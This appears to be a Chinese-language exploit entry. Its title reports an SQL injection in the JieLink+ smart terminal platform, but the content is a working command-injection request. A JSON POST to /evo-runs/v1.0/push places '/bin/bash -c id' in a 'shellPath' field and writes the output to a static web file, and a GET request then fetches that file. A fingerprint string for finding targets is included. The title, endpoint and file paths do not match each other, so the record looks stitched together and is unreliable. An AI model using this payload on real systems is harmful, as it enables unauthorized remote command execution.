# JieLink+智能终端操作平台DeleteIpPool存在SQL注入漏洞.docx

- **系统**：JieLink+智能终端操作平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`POST /evo-runs/v1.0/push HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`X-Subject-Headerflag: ADAPT`　`Content-Length: 243`

**请求体 / payload**
```
"method": "agent.ossm.mapping.config",
"info": {
"configure": "abcd",
"filePath": "haha",
"paramMap": {
"shellPath": "/bin/bash -c id>/opt/evoWpms/static/2.txt",
"filePath": "abc"
},
"requestIp": ""
GET /static/2.txt HTTP/1.1
```
- **预期**：200　|　—